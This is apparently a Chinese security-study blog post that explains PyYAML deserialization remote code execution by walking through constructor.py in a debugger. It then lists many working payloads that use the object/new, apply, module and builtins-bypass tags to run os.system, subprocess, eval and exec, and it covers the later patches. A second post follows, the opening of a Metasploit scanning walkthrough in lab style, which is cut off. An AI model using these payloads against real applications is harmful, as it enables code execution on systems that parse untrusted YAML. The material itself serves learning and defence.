输出解析后的Python对象 print(data) 输出结果： {'name': 'John', 'age': 30, 'person': &lt;__main__.Person object at 0x000001BA17055390&gt;} 这里对于代码有许多不懂得地方，结合GPT理解一番 首先看这行代码yaml.add_constructor('!python/object:__main__.Person', construct_person) 这里就是将!python/object:__main__.Person标签映射到construct_person函数，也就是说，当我们在解析yaml数据的时候，如果遇到了!python/object:__main__.Person标签，那就会自动的去调用construct_person函数。 而construct_person函数有两个参数，其中的node参数实际代表着节点，也就是!python/object:__main__.Person标签所对应的节点person，在调用construct_person函数的时候，会将person节点赋值给node，接着通过loader.construct_mapping函数，获取person节点中的属性值，转换为字典的形式，赋值给data参数，最后return的时候，实例化Person类，将对应的键值传入 load_all(data)——该函数上面也提到过，这里举个例子来理解 load_all(data)是一个函数调用表达式，其中data是一个包含多个YAML文档的字符串。load_all函数是PyYAML模块中的一个方法，用于从一个包含多个YAML文档的字符串中解析出所有的YAML文档，并返回一个生成器对象，每个元素都是一个Python对象，对应一个YAML文档。 import yaml # 定义包含两个YAML文档的字符串 yaml_data = \"\"\" - name: John age: 30 - name: Alice age: 25 \"\"\" # 使用yaml.load_all()方法解析所有的YAML文档 docs = yaml.load_all(yaml_data, Loader=yaml.Loader)#这里我仍然需要指定解析器参数 # 遍历生成器对象并输出解析后的Python对象 for doc in docs: print(doc) 输出结果： 这段代码使用PyYAML模块中的yaml.load_all()方法解析包含两个YAML文档的字符串，并输出每个文档解析后的Python对象。 load_all(data, Loader=yaml.Loader) load_all(data, Loader=yaml.Loader)是一个函数调用表达式，其中data是一个包含多个YAML文档的字符串，yaml.Loader是PyYAML模块中的一个解析器，用于解析YAML文档。 这里以默认的加载器Constructor为例，示例代码： import yaml # 定义包含两个YAML文档的字符串 yaml_data = \"\"\" - name: John age: 30 - name: Alice age: 25 \"\"\" # 使用yaml.load_all()方法解析所有的YAML文档 docs = yaml.load_all(yaml_data, Loader=yaml.Loader) # 遍历生成器对象并输出解析后的Python对象 for doc in docs: print(doc) 输出结果： [{'name': 'John', 'age': 30}, {'name': 'Alice', 'age': 25}] 这段代码使用PyYAML模块中的yaml.load_all()方法解析包含两个YAML文档的字符串，并输出每个文档解析后的Python对象。 以上是PyYaml&lt;=5.1版本中常见的一些方法实现python和Yaml语言格式的转换的方法，但是往往在这种语言格式的转换的同时，也会存在一定的漏洞点的。 漏洞成因–RCE 主要在PyYaml&lt;=5.1的版本下，默认Constructor为加载器，但是经过审计yaml模块中的Constructor.py的源码中存在对于python的标签解析时的漏洞。 下面我们分析一下Constructor.py，找一找在解析Python标签时的源码。 !!python/object标签 这里跟进yaml包之后如上图的函数，继续跟进，可以找到处理!!python/object标签的函数 def construct_python_object(self, suffix, node): # Format: # !!python/object:module.name { ... state ... } instance = self.make_python_instance(suffix, node, newobj=True) yield instance deep = hasattr(instance, '__setstate__') state = self.construct_mapping(node, deep=deep) self.set_python_instance_state(instance, state) !!python/object/apply标签 !!python/object/new标签 !!python/module标签 !!python/name标签 看上面前两个标签会发现都调用了make_python_instance()这个函数方法，所以我们接着往下看make_python_instance() def make_python_instance(self, suffix, node, args=None, kwds=None, newobj=False, unsafe=False): #用于创建Python对象的实例 if not args: args = [] #对args进行空值处理，如果不存在，将args设置为空列表 if not kwds: kwds = {} #对kwds进行空值处理，如果不存在，将kwds设置为空字典 cls = self.find_python_name(suffix, node.start_mark)#利用定义的find_python_name方法根据suffix字符串和node节点的起始标记查找Python对象的完整名称，然后获取该对象的类对象 if not (unsafe or i/sinstance(cls, type)): raise ConstructorError(\"while constructing a Python instance\", node.start_mark, \"expected a class, but found %r\" % type(cls), node.start_mark)#如果unsafe参数为False，并且获取的对象不是类对象，则抛出ConstructorError异常。 if newobj and isinstance(cls, type): return cls.__new__(cls, *args, **kwds) else: return cls(*args, **kwds) #根据newobj参数的值，以及获取的类对象是否为类型对象，选择使用__new__方法或__init__方法创建Python对象实例，并将args和kwds参数传递给构造函数。如果newobj为True且获取的类对象是类型对象，则使用__new__方法创建实例；否则，使用__init__方法创建实例 审计了一下make_python_instance()函数，可以发现，这里是通过args和kwds参数动态的创建Python对象的实例，所以，我们是可以利用这个特点进行执行我们的恶意代码，从而实现攻击。 我们可以发现在make_python_instance()中又调用了find_python_name()函数，接下来继续审计find_python_name() def find_python_name(self, name, mark, unsafe=False): if not name: raise ConstructorError(\"while constructing a Python object\", mark, \"expected non-empty name appended to the tag\", mark) #如果name为空，将会报错 if '.' in name: module_name, object_name = name.rsplit('.', 1) #如果name中包含\".\"，将会对name进行分割为模板名和对象名 else: module_name = 'builtins' object_name = name #如果name中没有\".\"，则会将模板名命名为\"builtins\"，对象名命名为\"name\" if unsafe: try: __import__(module_name) #unsafe默认为False，所以可以利用__import__将模块导入 except ImportError as exc: raise ConstructorError(\"while constructing a Python object\", mark, \"cannot find module %r (%s)\" % (module_name, exc), mark) #如果ImportError异常，将会报错 if not module_name in sys.modules: raise ConstructorError(\"while constructing a Python object\", mark, \"module %r is not imported\" % module_name, mark)#如果模块不在sys.modules字典中，将会报错 module = sys.modules[module_name] if not hasattr(module, object_name): raise ConstructorError(\"while constructing a Python object\", mark, \"cannot find %r in the module %r\" % (object_name, module.__name__), mark)#使用hasattr()函数查该模块是否包含了指定的对象名，如果没有将报错 return getattr(module, object_name)#利用getattr()函数获取返回值 通过审计find_python_name()，我们发现还可以通过引用module的类创建对象，从而执行我们的恶意代码，实现攻击。 在上述代码看完之后，我还是有很多不懂的点，因此就想着直接看最终payload去调试分析。 这里明确的是!!python/object标签并不能实现RCE，具体的下面分析，但我们先分析剩下的可以实现RCE的原因 先看!!python/object/apply标签和!!python/object/new标签（因为这两个标签的处理方法一样，就是newobj值不一样，我们看看最终是否会影响结果） 调试分析1 首先我们打一个端点，进入调试。步入之后，我们跟进get_single_data方法 继续跟进之后，我们来到下图位置，你也可以稍作尝试，会发现我们如果跟进construct_document方法的话，才是有趣的 接下来就是无脑跟进，我们的重点就是观察其中参数值的变化，尤其是关注os.system与calc.exe分别在哪写参数上 如上图，我们会看到已经跟进到处理这两个标签的关键函数了，我们可以看一下各参数值 如上图，这里的suffix为我们的os.system，也就是我们想要动态实例化的Python对象，我们现在可以回顾一下我们之前写的payload import yaml payload = '!!python/object/apply:os.system [\"calc.exe\"]' yaml.load(payload, Loader=yaml.Loader) 我们是搞了个键值对!!python/object/apply标签对应，这里我是觉得分析得不如GPT，因此我直接给GPT的回答了 重点分析给定的 `payload` 字符串 `'!!python/object/apply:os.system [\"calc.exe\"]'` 的组成和语法结构，进行详细解释如下： 1. `'!!python/object/apply:os.system'`： - `!!` 是 YAML 的标签前缀，用于指定要应用的标签类型。 - `python/object/apply:os.system` 是标签值，指定了要使用的构造器函数和模块路径。在这里，`apply` 标签表示要应用一个函数，`os.system` 是函数的路径，表示要调用 `os` 模块中的 `system` 函数。 2. `[\"calc.exe\"]`： - 这是一个包含单个元素 `\"calc.exe\"` 的列表。 - 这个列表是作为参数传递给构造器函数 `os.system` 的参数列表。 综合起来，给定的 `payload` 表达了一个 YAML 数据结构，它使用特定的标签和参数列表来构造一个对象。具体地说，它使用 `apply` 标签来调用 `os.system` 函数，将 `\"calc.exe\"` 作为参数传递给该函数。 需要注意的是，由于这个 `payload` 包含了敏感操作 `os.system(\"calc.exe\")`，在实际使用中应谨慎处理，以避免安全风险。在加载和解析此类 YAML 数据时，应确保可信任的数据源和适当的安全措施。 说白了，就是靠python/object/apply指定了构造器函数（也就是我们默认的constructor），然后想要去调用os.system函数，并传入calc这个参数。这样的话，我们再继续看上述跟进到的位置 suffix很明显了，就是被赋值为了os.system函数，没啥说的，接下来可以看一下node节点参数的内容 node=SequenceNode(tag='tag:yaml.org,2002:python/object/apply:os.system', value=[ScalarNode(tag='tag:yaml.org,2002:str', value='calc.exe')]) 对于为何 node 参数是这样的内容，GPT是这样回答的 对于给定的 YAML 数据 !!python/object/new:os.system [\"calc.exe\"]，如果将其进行反序列化（即使用适当的 YAML 解析器进行加载），则其中的 node 节点将是一个包含以下内容的字典： { '__yaml_tag__': 'tag:yaml.org,2002:python/object/apply:os.system', '__args__': ['calc.exe'] } 在这里，node 是一个字典，其中包含两个键值对： '__yaml_tag__' 键表示 YAML 标签，指示要实例化的对象类型。在这种情况下，标签为 'tag:yaml.org,2002:python/object/new:os.system'，表示要使用 os.system 类进行实例化。 '__args__' 键表示传递给构造函数的参数列表。在此示例中，['calc.exe'] 是作为参数传递给 os.system 构造函数的参数列表。 通过加载该 YAML 数据并解析 node 节点，可以使用相应的构造器函数和参数来实例化 os.system 类对象。请注意，由于该 YAML 数据包含敏感操作 os.system(\"calc.exe\")，在实际使用中应谨慎处理，以避免安全风险。 好，我们知道了上述参数的具体构成，接下来继续跟进，如果我们尝试过，就知道这里需要跟进一下construct_sequence来看看具体的函数逻辑 如上图，跟进之后看到这个函数，首先判断node的类型是否是SequenceNode，如果不是，则报错；否则，通过for语句提取出node中的value值然后返回，而我们知道其中的value值有一个calc.exe，这很有趣，继续跟进。 这里发现最终child的value值成了calc.exe 如上图，该函数在处理node的时候判断其是否是MappingNode实例，但根据值我们知道肯定不是，于是直接跳到return语句 上述return语句继续跟进函数的话，会到达上图，因为node是ScalarNode实例，于是他就直接返回node的value=calc.exe，但这里我有点懵，我想知道先前node的第一个value去哪了？？？所以我们重新调试一下看看 我们重新调试跟进到上方，突然就知道什么鬼了，之前就没注意，这里经过for循环将value给了child，但他的value是 value=[ScalarNode(tag='tag:yaml.org,2002:str', value='calc.exe')]) 当初我还以为是两个value，结果这里是value的嵌套。。。。继续跟进就顿悟了 如上图，可以看到这里是将child参数值传入给了node，因此这里的node成了上面的值 所以在下图，我们的node也就是之前的child经过处理，又取得他的value值，也就是calc.exe 这里继续无脑跟进一波 到达make_python_instance函数，跟进到如下图，发现有调用了find_python_name函数，接续跟进~ 继续跟进，如下图，这里的suffix的值赋给了name，node的start_mark给了mark 继续跟进，发现对name做了针对处理，首先通过rsplit的.符号将name分隔开，然后通过import导入了os模块，随后判断模块是否在sys的模块中（但很显然是在的） 最后通过getattr获取os模块里面的system方法 最后cls的值就是我们的os.system类，最后通过if语句的判断，来决定是通过new来实例化对象还是直接调用类的构造函数来实例化，显然其中的args是calc.exe，且最终是直接调用构造函数来实例化的，至于kwds为空 继续跟进就会发现弹出计算器了，至此分析完毕。 这里的isinstance函数是来判断cls是否为类对象，但我们最后的cls是os.system是一个函数，显然肯定不会进入if语句，由此可以知道为何apply与new标签的处理方法一致 调试分析2 这里可以分析剩下的三个标签了，如果你执行会发现没办法进行RCE，我们跟进看看为何 import yaml payload = '!!python/object:os.system [\"calc.exe\"]' yaml.load(payload, Loader=yaml.Loader) 针对上面代码，我们继续调试跟进到下方，进入make_python函数看看 进入该函数之前我认为可以与上述的apply、new标签对比一下就知道不同之处了，上述两个成功的标签对了一个对args参数的处理 如上图所示，这最终会导致args被赋值为calc.exe，但对于name、module标签来说，他们没有对args参数的处理，如果我们跟进会发现如下图的情况，会发现args被默认赋值为了none，导致最终的system没有参数传入，也就无法RCE 剩下的两个name与object标签都是这样的情况，不再赘述了 至此全部分析完毕，最终能导致RCE的标签就只有apply、new标签，这里给几个常见payload payload总结 poc = '!!python/object/new:os.system [\"calc.exe\"]' #给出一些相同用法的POC #poc = '!!python/object/new:subprocess.check_output [[\"calc.exe\"]]' #poc = '!!python/object/new:os.popen [\"calc.exe\"]' #poc = '!!python/object/new:subprocess.run [\"calc.exe\"]' #poc = '!!python/object/new:subprocess.call [\"calc.exe\"]' #poc = '!!python/object/new:subprocess.Popen [\"calc.exe\"]' #poc = \"\"\"!!python/object/new:os.system - calc.exe\"\"\" #poc = \"\"\" !!python/object/new:os.system args: [\"calc.exe\"]\"\"\" //这里将new与apply字符替换即可使用 漏洞成因–文件上传 !!python/module标签 原理：利用现有文件上传或者写文件的功能，传入一个写入命令执行代码的文件；将文件名写入标签中，当该标签被反序列化时，就可以顺利导入该文件作为模块，执行当中的命令 文件名yaml_test.py import os os.system('calc.exe') 如果在另一文件simple.py中，依次运行以下load代码 import yaml yaml.load(\"!!python/module:yaml_test\") #exp方法是随意写的，是不存在的，但必须要有，因为这是命名规则，不然会报错，主要是文件名yaml_test要写对 yaml.load(\"!!python/object:yaml_test.exp\" ) yaml.load(\"!!python/name:yaml_test.exp\" ) 都能成功弹出计算器 当然!!python/object/new和!!python/object/apply也可以用这种方式实现利用 yaml.load('!!python/object/apply:yaml_test.exp {}' ) yaml.load('!!python/object/new:yaml_test.exp {}' ) 如果我们调试分析就知道最终的name会被赋值为yaml_text，而被import导入，导入之后，其中的代码也会被执行，进而弹出计算器 以上要求是在同一目录下，如果不在同一目录下怎么办，好比如这种情况 ├── simple.py └── uploads └── yaml_test.py 那payload稍作修改，在文件名前加入目录名可 #经过测试只有modle标签可行 yaml.load(\"!!python/module:uploads.yaml_test\" ) 这里只要调试一下就知道问题出在哪里，在module与name的标签处理中 对于find_python对应函数的处理中，module标签没有经过rsplit函数的处理，而name经过了 当然文件名写成__init__.py将会更简单，payload只需目录即可，而且apply和new两个标签也可以构造利用了 yaml.load(\"!!python/module:uploads\" ) #exp表示着类实例，可以写成其他，虽不存在但是一定要有，否则报错 yaml.load('!!python/object/apply:uploads.exp {}' ) yaml.load('!!python/object/new:uploads.exp {}' ) 漏洞修复 大于5.1的版本，打了补丁（这里懒得找了，就直接cv文章） 通过调试发现，find_python_name方法（还有find_python_mdule方法也一样）增加了一个默认unsafe为false的值 就无法直接__import__，最终会报错 def find_python_name(self, name, mark, unsafe=False): if not name: raise ConstructorError(\"while constructing a Python object\", mark, \"expected non-empty name appended to the tag\", mark) if u'.' in name: module_name, object_name = name.rsplit('.', 1) else: module_name = '__builtin__' object_name = name if unsafe: try: __import__(module_name) except ImportError, exc: raise ConstructorError(\"while constructing a Python object\", mark, \"cannot find module %r (%s)\" % (module_name.encode('utf-8'), exc), mark) //这里查看是不是在sys.moudles字典里，不是就会进入直接报错 if module_name not in sys.modules: raise ConstructorError(\"while constructing a Python object\", mark, \"module %r is not imported\" % module_name.encode('utf-8'), mark) module = sys.modules[module_name] if not hasattr(module, object_name): raise ConstructorError(\"while constructing a Python object\", mark, \"cannot find %r in the module %r\" % (object_name.encode('utf-8'), module.__name__), mark) return getattr(module, object_name) 接下来执行这一段 if not (unsafe or isinstance(cls, type) or isinstance(cls, type(self.classobj))): raise ConstructorError(\"while constructing a Python instance\", node.start_mark, \"expected a class, but found %r\" % type(cls), node.start_mark) PyYaml&gt;5.1 在Python的PyYaml库中提供以下方法将python和yaml进行语言格式转换： load() 在PyYaml&gt;5.1的版本之后，如果要使用load()函数，要跟上一个Loader的参数，否则会报错。(不影响正常输出) tips：真尴尬，感情我上面分析了半天，用的都是&gt;5.1的版本。。。。但竟然能复现成？？ 这里其实和PyYaml&lt;=5.1版本一样，就不多赘述。 load(data, Loader=yaml.Loader) 这里说明一下PyYaml&gt;5.1都有哪些加载器 BaseLoader：不支持强制类型转换 SafeLoader：安全地加载 YAML 格式的数据，限制被加载的 YAML 数据中可用的 Python 对象类型，从而防止执行危险的操作或代码。 FullLoader：加载包含任意 Python 对象的 YAML 数据，FullLoader 加载器不会限制被加载的 YAML 数据中可用的 Python 对象类型，因此可以加载包含任意 Python 对象的 YAML 数据。 UnsafeLoader：加载包含任意 Python 对象的 YAML 数据，并且不会对被加载的 YAML 数据中可用的 Python 对象类型进行任何限制。 以SafeLoader为例，示例代码： import yaml class Person: def __init__(self, name, age): self.name = name self.age = age def person_constructor(loader, node): fields = loader.construct_mapping(node, deep=True) return Person(**fields) yaml_data = \"\"\" - !!python/object:__main__.Person name: Alice age: 25 - !!python/object:__main__.Person name: Bob age: 30 \"\"\" yaml.SafeLoader.add_constructor('tag:yaml.org,2002:python/object:__main__.Person', person_constructor) data = yaml.load(yaml_data, Loader=yaml.SafeLoader) for person in data: print(person.name, person.age) load_all(data, Loader=yaml.Loader) 以SafeLoader加载器为例，示例代码： import yaml class Person: def __init__(self, name, age): self.name = name self.age = age def person_constructor(loader, node): fields = loader.construct_mapping(node, deep=True) return Person(**fields) yaml_data = \"\"\" # 第一个文档 - !!python/object:__main__.Person name: Alice age: 25 # 第二个文档 - !!python/object:__main__.Person name: Bob age: 30 \"\"\" yaml.SafeLoader.add_constructor('tag:yaml.org,2002:python/object:__main__.Person', person_constructor) data = yaml.load_all(yaml_data, Loader=yaml.SafeLoader) for doc in data: for person in doc: print(person.name, person.age) 输出结果： Alice 25 Bob 30 这里其实和load(data, Loader=yaml.Loader)函数一样，就不多赘述了。 full_load(data) load()与full_load()函数的区别是，full_load()使用SafeLoader作为默认解析器。所以说，这是一个相对安全的解析器，它限制了可以执行的Python代码的类型。 示例代码： import yaml yaml_data = \"\"\" - foo - bar - baz \"\"\" data = yaml.full_load(yaml_data) print(data) 输出结果： ['foo', 'bar', 'baz'] full_load_all(data) full_load_all()与full_load()函数类似，但可以处理包含多个YAML文档的数据流。 示例代码： import yaml yaml_data = \"\"\" - foo - bar - baz --- - alice - bob - charlie \"\"\" data = yaml.full_load_all(yaml_data) for doc in data: print(doc) 输出结果： ['foo', 'bar', 'baz'] ['alice', 'bob', 'charlie'] unsafe_load(data) unsafe_load()函数可以加载包含自定义Python对象的YAML数据，允许加载和执行任意Python代码，并尝试将它们反序列化为实际的Python对象（存在安全隐患） 示例代码： import yaml yaml_data = \"\"\" !!python/object:__main__.Person name: Alice age: 25 \"\"\" class Person: def __init__(self, name, age): self.name = name self.age = age data = yaml.unsafe_load(yaml_data) print(data) 输出结果： &lt;__main__.Person object at 0x0000022DA0D36CD0&gt; unsafe_load_all(data) 相比unsafe_load()，unsafe_load_all()用于将多个YAML文档加载为Python对象的生成器。 示例代码： import yaml yaml_data = \"\"\" - foo - bar - baz --- - !!python/object:__main__.Person name: Alice age: 25 \"\"\" class Person: def __init__(self, name, age): self.name = name self.age = age data = yaml.unsafe_load_all(yaml_data) for doc in data: print(doc) 输出结果： ['foo', 'bar', 'baz'] [&lt;__main__.Person object at 0x00000174FFEBD210&gt;] 漏洞成因 这里的漏洞成因和PyYaml&lt;=5.1一样，都是constructor.py中的一些不严谨的代码引起的漏洞。 漏洞利用 我这里选用测试的PyYaml版本是5.1.1版本。 在PyYaml&gt;5.1的版本之后，Fullloader这个加载器对于payload的限制比较多了，我们延用PyYaml的poc还是可以的，只不过要修改一下。 我们还可以利用python内置的builtins模块(因为之前我们审计constructor.py时，发现定义的find_python_name()中，如果不用\".\"将模块名和对象名分开，会默认调用builtins模块) PyYaml&lt;=5.1的poc from yaml import * poc= b\"\"\"!!python/object/apply:os.system - calc\"\"\" #subprocess.check_output #os.popen #subprocess.run #subprocess.call #subprocess.Popen yaml.load(poc,Loader=Loader) builtins模块中的内置函数 builtins是python的内建模块，所谓内建模块就是你在使用时不需要import，在python启动后，在没有执行程序员编写的任何代码前，python会加载内建模块中的函数到内存中。 发现在find_python_name处理不带.，也就是module为空的情况下，自动默认module为builtins，并且该模块是在sys.modules中的 首先，我们先明确builtins中的所有的类，从而筛选出可以利用的类 import builtins builtin_classes = [] for obj_name in dir(builtins): obj = getattr(builtins, obj_name) if isinstance(obj, type): builtin_classes.append(obj) print(builtin_classes) [&lt;class 'ArithmeticError'&gt;, &lt;class 'AssertionError'&gt;, &lt;class 'AttributeError'&gt;, &lt;class 'BaseException'&gt;, &lt;class 'BlockingIOError'&gt;, &lt;class 'BrokenPipeError'&gt;, &lt;class 'BufferError'&gt;, &lt;class 'BytesWarning'&gt;, &lt;class 'ChildProcessError'&gt;, &lt;class 'ConnectionAbortedError'&gt;, &lt;class 'ConnectionError'&gt;, &lt;class 'ConnectionRefusedError'&gt;, &lt;class 'ConnectionResetError'&gt;, &lt;class 'DeprecationWarning'&gt;, &lt;class 'EOFError'&gt;, &lt;class 'OSError'&gt;, &lt;class 'Exception'&gt;, &lt;class 'FileExistsError'&gt;, &lt;class 'FileNotFoundError'&gt;, &lt;class 'FloatingPointError'&gt;, &lt;class 'FutureWarning'&gt;, &lt;class 'GeneratorExit'&gt;, &lt;class 'OSError'&gt;, &lt;class 'ImportError'&gt;, &lt;class 'ImportWarning'&gt;, &lt;class 'IndentationError'&gt;, &lt;class 'IndexError'&gt;, &lt;class 'InterruptedError'&gt;, &lt;class 'IsADirectoryError'&gt;, &lt;class 'KeyError'&gt;, &lt;class 'KeyboardInterrupt'&gt;, &lt;class 'LookupError'&gt;, &lt;class 'MemoryError'&gt;, &lt;class 'ModuleNotFoundError'&gt;, &lt;class 'NameError'&gt;, &lt;class 'NotADirectoryError'&gt;, &lt;class 'NotImplementedError'&gt;, &lt;class 'OSError'&gt;, &lt;class 'OverflowError'&gt;, &lt;class 'PendingDeprecationWarning'&gt;, &lt;class 'PermissionError'&gt;, &lt;class 'ProcessLookupError'&gt;, &lt;class 'RecursionError'&gt;, &lt;class 'ReferenceError'&gt;, &lt;class 'ResourceWarning'&gt;, &lt;class 'RuntimeError'&gt;, &lt;class 'RuntimeWarning'&gt;, &lt;class 'StopAsyncIteration'&gt;, &lt;class 'StopIteration'&gt;, &lt;class 'SyntaxError'&gt;, &lt;class 'SyntaxWarning'&gt;, &lt;class 'SystemError'&gt;, &lt;class 'SystemExit'&gt;, &lt;class 'TabError'&gt;, &lt;class 'TimeoutError'&gt;, &lt;class 'TypeError'&gt;, &lt;class 'UnboundLocalError'&gt;, &lt;class 'UnicodeDecodeError'&gt;, &lt;class 'UnicodeEncodeError'&gt;, &lt;class 'UnicodeError'&gt;, &lt;class 'UnicodeTranslateError'&gt;, &lt;class 'UnicodeWarning'&gt;, &lt;class 'UserWarning'&gt;, &lt;class 'ValueError'&gt;, &lt;class 'Warning'&gt;, &lt;class 'OSError'&gt;, &lt;class 'ZeroDivisionError'&gt;, &lt;class '_frozen_importlib.BuiltinImporter'&gt;, &lt;class 'bool'&gt;, &lt;class 'bytearray'&gt;, &lt;class 'bytes'&gt;, &lt;class 'classmethod'&gt;, &lt;class 'complex'&gt;, &lt;class 'dict'&gt;, &lt;class 'enumerate'&gt;, &lt;class 'filter'&gt;, &lt;class 'float'&gt;, &lt;class 'frozenset'&gt;, &lt;class 'int'&gt;, &lt;class 'list'&gt;, &lt;class 'map'&gt;, &lt;class 'memoryview'&gt;, &lt;class 'object'&gt;, &lt;class 'property'&gt;, &lt;class 'range'&gt;, &lt;class 'reversed'&gt;, &lt;class 'set'&gt;, &lt;class 'slice'&gt;, &lt;class 'staticmethod'&gt;, &lt;class 'str'&gt;, &lt;class 'super'&gt;, &lt;class 'tuple'&gt;, &lt;class 'type'&gt;, &lt;class 'zip'&gt;] 现在就是找可以利用的类了，继续回到我们的constructor.py中，进一步审计 construct_python_object_apply()时，发现了一个漏洞点 如果listitems不为空，则调用instance的extend()方法，将listitems中的所有元素添加到instance列表对象的末尾，instance是我们创建的实例，这里并没有定义listitems是什么，如果我们的listitems是一个字典，而且其内容有\"{‘extend’:function}\"，这样的话，我们就可以利用extend进行任意函数的执行了。 但是，经过测试，发现上面builtins中的这些类中，只有frozenset，bytes，tuple这三个类可以进行命令执行，为了搞清楚为什么，我们继续审计源码。 我们接着看make_python_instance()， 这里只要我们的内置类可以执行cls.__new__(cls, *args, **kwds)这段代码，就可以根据参数来动态创建新的Python对象，从而进行命令执行。 所以猜测frozenset，bytes，tuple应该是可以执行上述代码，所以可以进行命令执行的 payload !!python/object/new:bytes - !!python/object/new:map - !!python/name:eval - [\"__import__\\x28'pickle'\\x29.load\\x28open\\x28'fileinfo/pik','rb'\\x29\\x29\"] !!python/object/new:frozenset - !!python/object/new:map - !!python/name:os.popen - [\"bash /app/fileinfo/cmd\"] !!python/object/new:tuple - !!python/object/new:map - !!python/name:eval - [\"print(123)\"] 发现都是有回显的，这里顺便附上一些文章找到的payload，供大家使用: #报错但是执行了 - !!python/object/new:str args: [] state: !!python/tuple - \"__import__('os').system('whoami')\" - !!python/object/new:staticmethod args: [0] state: update: !!python/name:exec - !!python/object/new:yaml.MappingNode listitems: !!str '!!python/object/apply:subprocess.Popen [whoami]' state: tag: !!str dummy value: !!str dummy extend: !!python/name:yaml.unsafe_load #创建了一个类型为z的新对象,而对象中extend属性在创建时会被调用,参数为listitems内的参数 !!python/object/new:type args: [\"z\", !!python/tuple [], {\"extend\": !!python/name:exec }] listitems: \"__import__('os').system('whoami')\" 我们可以用python的内置函数eval（或者exec）来执行代码，用map来触发函数执行，用tuple将map对象转化为元组输出来（当然用list、frozenset、bytes都可以），用python写出来如下 tuple(map(eval, [\"__import__('os').system('whoami')\"])) 变为yaml yaml.load(\"\"\" !!python/object/new:tuple - !!python/object/new:map - !!python/name:eval - [\"__import__('os').system('whoami')\"] \"\"\") PS: 当利用上述payload测试到5.2b1版本时，发现无法利用针对!!python/object/apply标签的payload了，别的都可以利用 上述payload当我测试到5.4b1版本时，发现只有利用针对!!python/name标签的payload可以命令执行，别的payload都不能用了 一些高版本的绕过方式，由于不是很常见，这里就不多介绍了 当版本大于等于5.3.1:Prevents arbitrary code execution during python/object/new constructor by ret2libc · Pull Request #386 · yaml/pyyaml · GitHub 当版本大于等于6.0:Prevents arbitrary code execution during python/object/new constructor by ret2libc · Pull Request #386 · yaml/pyyaml · GitHub 利用ruamel.yaml读写yaml文件 在网上搜资料的时候，发现了也可以利用ruamel.yaml读写yaml文件，所以我在想，是不是也存在PyYaml反序列化漏洞，进行测试一下。 这里还是沿用PyYaml&gt;5.1的poc import ruamel.yaml poc= b\"\"\"!!python/object/apply:os.system - calc\"\"\" ruamel.yaml.load(poc)#py2下运行 0x05 参考文章 PyYAML反序列化漏洞 浅谈PyYAML反序列化漏洞 PyYaml反序列化漏洞详解 SecMap - 反序列化（PyYAML）","tags":["基本知识"],"categories":["web知识总结"]},{"title":"Metasploit学习","path":"/2024/03/23/metasploit-xue-xi/","content":"0x01 简介 在这个房间里，我们将学习如何使用Metasploit进行漏洞扫描和利用。我们还将介绍数据库功能如何使管理更广泛范围的渗透测试活动变得更容易。最后，我们将研究使用 msfvenom 生成有效负载以及如何在大多数目标平台上启动 Meterpreter 会话。 更具体地说，我们将讨论的主题是： 如何使用 Metasploit 扫描目标系统。 如何使用 Metasploit 数据库功能。 如何使用Metasploit进行漏洞扫描。 如何使用 Metasploit 来利用目标系统上的易受攻击的服务。 如何用于创建有效负载并在目标系统上获取 Meterpreter 会话。 请注意，对于所有需要使用单词列表的问题（例如暴力攻击），我们将使用位于以下路径的 AttackBox 上的单词列表： /usr/share/wordlists/MetasploitRoom/MetasploitWordlist.txt 如果您选择使用自己的机器，请单击右侧的“下载任务文件”按钮下载单词表。 启动 AttackBox 并使用该房间中的命令运行 Metasploit。 0x02 扫描 端口扫描 Metasploit 有许多模块可以扫描目标系统和网络上的开放端口。您可以使用 search portscan 命令列出可用的潜在端口扫描模块。 端口扫描模块将要求您设置一些选项： CONCURRENCY：同时扫描的目标数量。 PORTS：要扫描的端口范围。请注意，此处的 1-10000 与使用默认配置的 Nmap 不同。 Nmap 将扫描最常用的 1000 个端口，而 Metasploit 将扫描从 1 到 10000 的端口号。 RHOTS：要扫描的目标或目标网络。 THREADS：将同时使用的线程数。更多线程将导致更快的扫描。 您可以直接从 msfconsole 提示符执行 Nmap 扫描，如下所示，速度更快： msf6 &gt; nmap -sS 10.10.12.229 [*] exec: nmap -sS 10.10.12.229 Starting Nmap 7.60 ( https://nmap.org ) at 2021-08-20 03:54 BST Nmap scan report for ip-10-10-12-229.eu-west-1.compute.internal (10.10.12.229) Host is up (0.0011s latency). Not shown: 992 closed ports PORT STATE SERVICE 135/tcp open msrpc 139/tcp open netbios-ssn 445/tcp open microsoft-ds 3389/tcp open ms-wbt-server 49152/tcp open unknown 49153/tcp open unknown 49154/tcp open unknown 49158/tcp open unknown MAC Address: 02:CE:59:27:C8:E3 (Unknown) Nmap done: 1 IP address (1 host up) scanned in 64.19 seconds msf6 &gt; 至于信息收集，如果您的参与需要更快的端口扫描方法，Metasploit 可能不是您的首选。然而，许多模块使 Metasploit 成为扫描阶段的有用工具。 UDP 服务识别 scanner/discovery/udp_sweep 模块将允许您快速识别通过 UDP（用户数据报协议）运行的服务。如下所示，该模块不会对所有可能的 UDP 服务进行广泛扫描，但确实提供了一种快速方法来识别 DNS 或 NetBIOS 等服务。 SMB 扫描 Metasploit 提供了几个有用的辅助模块，使我们能够扫描特定的服务。以下是 SMB 的示例。 smb_enumshares 和 smb_version 在公司网络中特别有用，但请花一些时间来识别系统上安装的 Metasploit 版本提供的扫描程序。 msf6 auxiliary(scanner/smb/smb_version) &gt; run [+] 10.10.12.229:445 - Host is running Windows 7 Professional SP1 (build:7601) (name:JON-PC) (workgroup:WORKGROUP ) (signatures:optional) [*] 10.10.12.229:445 - Scanned 1 of 1 hosts (100% complete) [*] Auxiliary module execution completed msf6 auxiliary(scanner/smb/smb_version) &gt; 执行服务扫描时，重要的是不要忽略更多“奇异”服务，例如 NetBIOS。 NetBIOS（网络基本输入输出系统）与SMB类似，允许计算机通过网络进行通信以共享文件或将文件发送到打印机。目标系统的 NetBIOS 名称可以让您了解其角色甚至重要性（例如 CORP-DC、DEVOPS、SALES 等）。您还可能会遇到一些无需密码即可访问或受简单密码保护的共享文件和文件夹（例如 admin、administrator、root、toor 等）。 请记住，Metasploit 有许多模块可以帮助您更好地了解目标系统，并可能帮助您发现漏洞。执行快速搜索总是值得的，看看是否有任何模块可以根据您的目标系统提供帮助。 目标系统上打开了多少个端口？ 使用相关扫描仪，您可以看到什么 NetBIOS 名称？ msf6 auxiliary(scanner/discovery/udp_sweep) &gt; use auxiliary/scanner/netbios/nbname msf6 auxiliary(scanner/netbios/nbname) &gt; options Module options (auxiliary/scanner/netbios/nbname): Name Current Setting Required Description ---- --------------- -------- ----------- BATCHSIZE 256 yes The number of hosts to probe in each set RHOSTS yes The 